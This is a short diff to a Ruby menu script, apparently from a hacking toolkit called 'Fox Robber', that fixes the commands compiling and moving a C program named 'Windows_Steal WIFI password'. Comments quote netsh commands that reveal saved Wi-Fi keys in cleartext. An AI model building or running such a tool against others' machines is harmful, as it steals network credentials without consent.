@@ -50,8 +50,9 @@ while true
             #'netsh wlan show profile'
             #'netsh wlan show profile WiFi-name key=clear'
             puts 'File made by Fox Robber 🦊'
-            system('gcc /Windows/./Windows_Steal WIFI password.c')
-            system('mv Windows_s.out Out/')
+            system('gcc Windows/Windows_Steal\ WIFI\ password.c')
+            system('sleep 1')
+            system('mv a.out Windows_s.out Out/')
             system('sleep 1')
             system("echo \"\t<Press enter>\" | lolcat -a")
             gets.chomp
